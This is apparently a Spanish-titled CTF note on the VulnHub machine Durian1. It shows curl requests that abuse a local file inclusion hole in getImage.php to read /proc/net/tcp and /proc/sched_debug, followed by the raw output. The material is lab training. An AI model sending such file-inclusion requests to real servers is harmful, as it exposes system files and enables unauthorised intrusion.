# ENUMERACION LINUX PROC

```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/Durian1/nmap]
└─$ curl -s X GET http://192.168.200.143/cgi-data/getImage.php?file=/proc/net/tcp
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
  /*
</?php include $_GET['file']; */
</body>
</html>


  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                 
   0: 00000000:1BA8 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17784 1 00000000423e3277 100 0 0 10 128               
   1: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   106        0 17962 1 000000009754e893 100 0 0 10 0                 
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17586 1 00000000bbc30e72 100 0 0 10 0                 
   3: 00000000:1F98 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17786 1 00000000bfca24be 100 0 0 10 128               
                                                                                                                                                                                        
```


[Conver ibase obase](https://linuxhint.com/convert_hexadecimal_decimal_bash/)


┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/Durian1/nmap]
└─$ curl -s -X GET http://192.168.200.143/cgi-data/getImage.php?file=/proc/sched_debug

<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
  /*
</?php include $_GET['file']; */
</body>
</html>

Sched Debug Version: v0.11, 4.19.0-10-amd64 #1
ktime                                   : 417145.373424
sched_clk                               : 417166.588248
cpu_clk                                 : 417161.705715
jiffies                                 : 4294996347
sched_clock_stable()                    : 1

sysctl_sched
.sysctl_sched_latency                    : 6.000000
.sysctl_sched_min_granularity            : 0.750000
.sysctl_sched_wakeup_granularity         : 1.000000
.sysctl_sched_child_runs_first           : 0
.sysctl_sched_features                   : 4118331
.sysctl_sched_tunable_scaling            : 1 (logaritmic)
